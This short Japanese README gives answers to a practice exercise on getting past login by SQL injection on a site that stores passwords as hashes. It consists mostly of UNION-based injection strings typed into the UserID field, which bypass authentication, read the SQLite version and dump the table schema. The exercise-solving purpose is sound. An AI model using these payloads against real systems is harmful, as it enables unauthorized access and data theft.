# try_SQL_inj

## パスワードがハッシュ値で保存されているサイトのSQLインジェクションによる認証回避の練習問題

- [問題文](https://qiita.com/ockeghem/items/787f74801a24e1fc6960)
- [password_verify](https://www.php.net/manual/ja/function.password-verify.php)
- [3. Literal Values(Constants)](https://www.sqlite.org/lang_expr.html)

### 練習問題
- UserID: `' UNION ALL SELECT id, 'admin', password, email FROM users WHERE userid = 'alice`

### ソースコードの内容に依存しない解法

- UserID: ``

### SQLiteのバージョン

- UserID: `' UNION ALL SELECT id, sqlite_version(), password, email FROM users WHERE userid = 'alice`

### テーブル情報

- UserID: `' UNION ALL SELECT id, (select sql from sqlite_master where type='table'), password, email FROM users WHERE userid = 'alice`
